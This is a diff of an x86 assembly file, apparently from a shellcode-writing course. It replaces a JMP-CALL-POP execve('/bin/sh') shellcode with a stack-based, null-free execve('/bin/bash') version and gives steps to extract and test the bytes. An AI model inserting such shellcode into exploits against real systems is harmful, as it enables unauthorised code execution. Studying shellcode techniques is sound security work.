@@ -1,14 +1,14 @@
-; Executable name : execve_01_bash_shell
+; Executable name : execve_03_bash_stack
 ; Version         : 1.0
 ; Created date    : 07/02/2020
 ; Last update     : 07/02/2020
 ; Author          : bigb0ss
-; Description     : 1) This is to run "/bin/sh" using execve function
-;                   2) This will leverage a technique called JMP-CALL-POP to read "/bin/sh" from the stack. 
+; Description     : 1) This is to run "/bin/bash" using execve function
+;                   2) This will leverage stack to hardcode "/bin/bash" with shellcode. 
 ;                   3) Once .nasm created --> Compile it
 ;                   4) Extract the shellcode using objdump
 ;                   5) Update the skeleton.c with the shellcode --> Compile it
-;                   6) Run the program to see if we can successfully load "/bin/sh"
+;                   6) Run the program to see if we can successfully load "/bin/bash"
 ;
 ;                  
 ; ================================ Execve Layout ================================
@@ -16,7 +16,7 @@
 ;            -------- EBX -------- ------- ECX ------- ------- EDX --------
 ;                      ⬇                                       ⬇
 ;               "/bin/bash, 0x0"            ⬇            "0x00000000"
-;                              "Addr of /bin/sh, 0x00000000"
+;                            "Addr of /bin/bash, 0x00000000"
 ; ===============================================================================
 ;
 
@@ -26,33 +26,29 @@ section .text
 
 _start:
 
-        jmp short call_shellcode	      ; Doing a short jump to call "call_shellcode" label 
-        
-
-shellcode:
-        
-        pop esi				      ; POPing "/bin/shABBBBCCCC" on the stack at ESI register
-        
+	xor eax, eax			; Preparing Nulls in EAX register
+	push eax			; Pushing the first Null DWORD
 	
-        ; Preparing for values to utilize for further execve layout usage
-        xor ebx, ebx			      ; Making the EBX value to 0 for Null terminator for /bin/sh
-        mov byte [esi +7], bl		      ; Moving 0 to "A" location
-        mov dword [esi +8], esi	      	      ; Moving ESI address (DWORD) to "BBBB" location
-        mov dword [esi +12], ebx	      ; Moving 0s to "CCCC" address
-
-
-        ; Placing each value for execve usage
-        lea ebx, [esi]			      ; Moving ESI to EBX location (= filename)
-        lea ecx, [esi +8]		      ; Moving address of ESI to ECX (= argv[])
-        lea edx, [esi +12]		      ; Moving 0s to EDX (= evnp[])
-        
-      	; exit() syscall
-	xor eax, eax		              ; Set EAX to zero
-  	mov al, 0xb	                      ; Adding "11" to AL (= lower byte of EAX)
+	; ////bin/bash (12 bytes) - "/" does not affect when running "/bin/bash" while being interpretated
+	;
+	; [Reverse order of ////bin/bash]
+	; String length : 12
+	; hsab : 68736162
+	; /nib : 2f6e6962
+	; //// : 2f2f2f2f
+	
+	push 0x68736162
+	push 0x2f6e6962
+	push 0x2f2f2f2f
+	
+	mov ebx, esp
+	push eax
+	mov edx, esp
+	push ebx
+	mov ecx, esp
+	
+	; syscall()
+	mov al, 0xb
 	int 0x80
 
-
-call_shellcode:
-
-	call shellcode
-	message db "/bin/shABBBBCCCC"
+	
